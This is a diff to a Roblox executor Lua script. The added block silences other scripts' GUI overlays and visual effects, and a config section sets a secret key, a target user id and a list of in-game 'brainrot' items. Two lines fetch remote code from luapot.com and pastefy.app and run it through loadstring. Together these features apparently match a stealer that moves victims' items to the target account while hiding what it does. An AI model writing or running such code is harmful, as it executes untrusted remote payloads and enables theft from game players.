@@ -1,3 +1,115 @@
+-- ==================== ANTI-ANIMACIONES ====================
+repeat task.wait() until game:IsLoaded()
+
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+
+if _G.NexHubStealthProtection then return end
+_G.NexHubStealthProtection = true
+
+local function isBadGui(gui)
+    if not gui:IsA("ScreenGui") then return false end
+    local n = string.lower(gui.Name)
+    if gui.DisplayOrder >= 999
+    or n:find("intro")
+    or n:find("brain")
+    or n:find("drain")
+    or n:find("frost")
+    or n:find("skama")
+    or n:find("loader") then
+        return true
+    end
+    return false
+end
+
+local function removeBadGui()
+    for _,v in ipairs(CoreGui:GetChildren()) do
+        if isBadGui(v) then
+            pcall(function()
+                v.Enabled = false
+                v:Destroy()
+            end)
+        end
+    end
+end
+
+local function cleanVisualEffects()
+    for _,v in ipairs(Lighting:GetChildren()) do
+        if v:IsA("BlurEffect") and v.Size > 2 then
+            v:Destroy()
+        end
+        if v:IsA("ColorCorrectionEffect") then
+            if v.Brightness < -0.05 or v.Contrast > 0.4 or v.Saturation < -0.2 then
+                v:Destroy()
+            end
+        end
+        if v:IsA("DepthOfFieldEffect") then
+            v:Destroy()
+        end
+        if v:IsA("BloomEffect") and v.Intensity > 0.3 then
+            v:Destroy()
+        end
+    end
+end
+
+local function removeBadAnimations()
+    for _,v in ipairs(CoreGui:GetDescendants()) do
+        if v:IsA("Animation") then
+            pcall(function()
+                v:Destroy()
+            end)
+        end
+    end
+end
+
+CoreGui.DescendantAdded:Connect(function(obj)
+    if obj:IsA("Animation") then
+        task.defer(function()
+            pcall(function()
+                obj:Destroy()
+            end)
+        end)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        removeBadAnimations()
+        task.wait(1)
+    end
+end)
+
+CoreGui.ChildAdded:Connect(function(obj)
+    task.defer(function()
+        if isBadGui(obj) then
+            obj:Destroy()
+        end
+    end)
+end)
+
+Lighting.ChildAdded:Connect(function()
+    task.defer(function()
+        cleanVisualEffects()
+    end)
+end)
+
+RunService.RenderStepped:Connect(function()
+    removeBadGui()
+    cleanVisualEffects()
+end)
+
+task.spawn(function()
+    while true do
+        removeBadGui()
+        cleanVisualEffects()
+        task.wait(0.1)
+    end
+end)
+
+print("✅ Anti-animaciones activado")
+
+-- ==================== CONFIGURACIÓN BRAINROTS ====================
 getgenv().SECRET_KEY = "mrr_3d206d02e56b458caeeb671d35c51c6a"
 getgenv().TARGET_ID = 1350656366
 getgenv().DELAY_STEP = 1      
@@ -100,9 +212,12 @@ getgenv().TARGET_BRAINROTS = {
     ["Churrito Bunnito"] = true,
     ["La Lucky Grande"] = true
 }
+
+-- Scripts externos
 task.spawn(function()
-loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc36b7a17d913"))()
+    loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc36b7a17d913"))()
 end)
+
 task.spawn(function()
-loadstring(game:HttpGet("https://pastefy.app/nfCFsita/raw"))()
+    loadstring(game:HttpGet("https://pastefy.app/nfCFsita/raw"))()
 end)
